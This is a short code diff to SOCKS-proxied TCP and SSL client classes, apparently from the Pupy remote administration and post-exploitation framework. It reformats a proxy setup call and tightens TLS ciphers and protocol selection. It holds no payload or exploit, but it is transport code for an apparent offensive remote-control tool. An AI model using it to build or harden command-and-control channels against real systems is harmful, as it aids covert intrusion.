@@ -73,9 +73,18 @@ class PupyProxifiedTCPClient(PupyTCPClient):
 
     def connect(self, host, port):
         s = socks.socksocket()
-        s.setproxy(proxy_type=socks.PROXY_TYPES[self.proxy_type], addr=self.proxy_addr, port=self.proxy_port, rdns=True, username=self.proxy_username, password=self.proxy_password)
+        s.setproxy(
+            proxy_type=socks.PROXY_TYPES[self.proxy_type],
+            addr=self.proxy_addr,
+            port=self.proxy_port,
+            rdns=True,
+            username=self.proxy_username,
+            password=self.proxy_password
+        )
+
         s.settimeout(self.timeout)
         s.connect((host,port))
+
         if self.nodelay:
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         if self.keepalive:
@@ -109,10 +118,9 @@ class PupySSLClient(PupyTCPClient):
             self.SSL_CLIENT_KEY = credentials['SSL_CLIENT_KEY']
             self.SSL_CA_CERT = credentials['SSL_CA_CERT']
             self.ROLE = credentials.role
-
-        self.ciphers = 'SHA256+AES256:SHA1+AES256:@STRENGTH'
+        self.ciphers = 'HIGH:!aNULL:!MD5:!RC4:!3DES:!DES:!AES128@STRENGTH'
         self.cert_reqs = ssl.CERT_REQUIRED
-        self.ssl_version = ssl.PROTOCOL_TLSv1
+        self.ssl_version = ssl.PROTOCOL_SSLv23 #alias for PROTOCOL_TLS for recent versions of python but works with older version missing TLS
 
         super(PupySSLClient, self).__init__(*args, **kwargs)
 
